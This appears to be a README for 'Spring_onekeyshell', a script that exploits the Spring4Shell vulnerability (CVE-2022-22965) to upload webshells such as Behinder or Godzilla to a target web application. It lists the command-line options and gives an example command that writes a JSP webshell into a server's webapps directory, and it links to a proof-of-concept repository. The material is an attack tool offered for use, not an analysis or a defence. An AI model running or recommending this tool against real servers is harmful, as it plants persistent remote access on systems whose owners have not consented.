# Spring_onekeyshell
Upload the webshell such as behinder or godzilla to target by CVE-2022-22965
## Instructions
1. download spring_onekeyshell.py
2. run the script:
- `--url` target url
- `--ws` WebShell File [example.jsp]
- `--file` File to write to [no extension]
- `--dir` Directory to write to. Suggest using "webapps/[appname]" of target app
```
python spring_onekeyshell.py --url http://localhost:8080/helloworld --ws /tmp/webshell.jsp --file vuln --dir webapps/ROOT
```
## Reference：
https://github.com/reznok/Spring4Shell-POC
